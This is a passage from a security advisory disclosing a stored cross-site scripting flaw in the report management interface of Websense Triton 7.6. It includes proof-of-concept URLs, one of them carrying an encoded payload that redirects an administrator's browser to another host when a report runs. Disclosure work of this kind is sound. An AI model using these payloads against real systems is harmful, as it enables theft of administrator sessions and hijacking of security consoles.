III. DESCRIPTION
-------------------------
Websense (Triton 7.6) is prone to stored XSS in the report management UI enabling an attacker run arbitrary javasript in the context of the administrators browser and the Websense administrative UI.

IV. PROOF OF CONCEPT
-------------------------
Affected URL:

https://192.168.233.30:9443/explorer_wse/favorites.exe
(though I believe there may be other affected URLs)

Examples:

Alert pop-up containing the cookies

https://192.168.233.30:9443/explorer_wse/favorites.exe?Program=ws_irpt.exe&params=startDate=2011-10-29^endDate=2011-10-
29^rnd=936737^&favName=---------------------------------------------------------------------------------------------------------------------------------------------------

Arbitrary redirect

https://192.168.233.30:9443/explorer_wse/favorites.exe?Program=ws_irpt.exe&params=startDate=2011-10-29^endDate=2011-10-
29^rnd=936737^&favName=---------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
%22,%2215%22,%229%22,%2228%22,%2215%22,%229%22,%2228%22]]%3bdocument.location%20%3d%20%22%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%32%33%33%2e%31%31%2findex2.html
%22%3b//&user=admin&uid=&action=add&startDate=2011-10-29&endDate=2011-10-29&vrn=

In these cases when and administrator subsequently runs a report, the javascript is executed. There are other ways to execute Javascript when the page is initially loaded (but I thought this was a good example).
